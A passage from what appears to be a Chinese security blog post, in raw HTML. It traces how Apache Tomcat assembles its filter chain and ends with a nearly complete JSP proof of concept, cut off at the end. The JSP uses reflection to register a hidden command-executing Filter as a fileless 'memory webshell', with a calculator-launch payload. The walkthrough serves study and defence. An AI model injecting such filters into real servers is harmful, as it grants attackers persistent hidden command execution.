punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShellFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span>  <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter 初始构造完成"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行了操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter 销毁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>xml配置模式：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span>com.yyjccc.memorytrojan.Tomcat.ShellFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/filter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span></code></pre><p>注解配置：@WebFilter(“/*”)</p><h3 id="Filter创建流程分析"><a href="#Filter创建流程分析" class="headerlink" title="Filter创建流程分析"></a>Filter创建流程分析</h3><p>逆向走起<br>在我们的dofilter方法上打上断点<br><img src="/img/3-6/2.png"><br>这里观察函数栈帧，现在就根据函数调用栈逐层往上找filter是怎么程创建的<br>进入上一层ApplicationFilterChain#internalDoFilter方法中<br><img src="/img/3-6/3.png"><br>这里也是filter.doFilter()，且这个filter就是我们定义的filter。继续寻找这个filter怎么来的<br>在这个方法内的前面<br><img src="/img/3-6/4.png"><br>filter是从filterConfig中获取，一个filterConfig对应一个Filter，用于存储Filter的上下文信息，而filterConfig是从属性filters – ApplicationFilterConfig数组中获得。<br>这里还没有看到filter到底来的，继续往上面一层栈帧<br><img src="/img/3-6/5.png"><br>它主要是进行了 Globals.IS_SECURITY_ENABLED，也就是全局安全服务是否开启的判断。<br>继续往上走，进入StandardWrapperValve#invoke方法中<br><img src="/img/3-6/6.png"><br>这里filiterChain就是ApplicationFilterChain对象，找它怎么来的<br><img src="/img/3-6/7.png"><br>ApplicationFilterFactory#createFilterChain创建出filterChain<br>在这里打上断点重新调试<br><img src="/img/3-6/8.png"><br>其中的关键代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ApplicationFilterChain</span> <span class="token function">createFilterChain</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span>            <span class="token class-name">Wrapper</span> wrapper<span class="token punctuation">,</span> <span class="token class-name">Servlet</span> servlet<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment">// Request dispatcher in use</span>        filterChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         filterChain<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span>servlet<span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">setServletSupportsAsync</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Acquire the filter mappings for this Context</span>        <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FilterMap</span> filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token class-name">String</span> servletName <span class="token operator">=</span> wrapper<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Add the relevant path-mapped filters to this filter chain</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">FilterMap</span> filterMap <span class="token operator">:</span> filterMaps<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span>                    context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token comment">// Return the completed filter chain</span>        <span class="token keyword">return</span> filterChain<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>省略了函数中一些不重要的判断，从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程</p><ol><li>首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象</li><li>然后通过wrapper.getParent()函数来获取StandardContext对象</li><li>接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息</li><li>最后根据Filter的名称，在StandardContext中获取FilterConfig</li><li>通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中</li></ol><p>addFilter():<br><img src="/img/3-6/9.png"><br>这里就把获取到filterConfig中放入前面的属性中</p><p>其实到这里是从context中拿到一些属性进行操作，将filterConfig放入到FilterChain中<br>，Filter内存马的思路就是，在放入FilterChain之前我们就通过反射赋值或者增加一些内容，然后tomcat就会自动的调用上面流程的代码，将恶意的filter放入filterChain,再进行调用调用其实如下图：<br><img src="/img/3-6/10.png"></p><p><strong>总之，注入内存马是在上游的操作，而上面分析的流程在下游部分</strong></p><h3 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h3><p>Context-Filter成分分析图：<br><img src="/img/3-6/11.png"><br>context首尾相连了<br>进入addFilter方法<br><img src="/img/3-6/12.png"><br>发现，这里以前的filters数组原来会重新创建一个容量更大的数组，并拷贝原有的数组。</p><ul><li>FilterConfig</li></ul><p>其中filterConfigs包含了当前的上下文信息StandardContext、以及filterDef等信息<br>上下文对象StandardContext实际上是包含FilterConfig、FilterDef和FilterMaps了这三者的<br><img src="/img/3-6/13.png"><br>查看context:</p><ul><li>filterDef</li></ul><p>其中filterDef存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<filter>标签。<br>同下配置</filter></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span></code></pre><img src="/img/3-6/14.png">可以看到，filterDef必要的属性为filter、filterClass以及filterName。<ul><li>filterDefs</li></ul><p>filterDefs是一个HashMap，以键值对的形式存储filterDef<br><img src="/img/3-6/15.png"></p><ul><li>filterMaps</li></ul><img src="/img/3-6/16.png">context中的filterMaps中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<filter-mapping>标签等同于下面配置<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span></code></pre>filterMaps必要的属性为dispatcherMapping、filterName、urlPatterns<p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p><h3 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h3><p>根据成分分析图，其实动态注册的步骤就是对上面属性的赋值</p><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路:</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。<br>这里获取context与后面Servlet第一种获取方式相同</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//获取ApplicationContextFacade类</span><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span><span class="token class-name">Field</span> appContextField <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>appContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取ApplicationContext类属性context为StandardContext类</span><span class="token class-name">Field</span> standardContextField <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>standardContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>恶意Filter</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CmdServlet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span>  <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><p>使用FilterDef封装filter<br>这个过程和后面的注册Servlet十分类似</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"filterShell"</span><span class="token punctuation">;</span><span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CmdFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span><span class="token class-name">CmdFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>创建filterMap用于filter和路径的绑定</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token constant">REQUEST</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addFilterMap</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>封装filterConfig及filterDef到filterConfigs<br>使用ApplicationFilterConfig的构造方法，不过需要反射构造<br><img src="/img/3-6/17.png"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CmdFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span>  <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token comment">//获取ApplicationContextFacade类</span>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span>    <span class="token class-name">Field</span> appContextField <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    appContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取ApplicationContext类属性context为StandardContext类</span>    <span class="token class-name">Field</span> standardContextField <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standardContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"filtershell"</span><span class="token punctuation">;</span>    <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CmdFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span><span class="token class-name">CmdFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token constant">REQUEST</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addFilterMap</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token 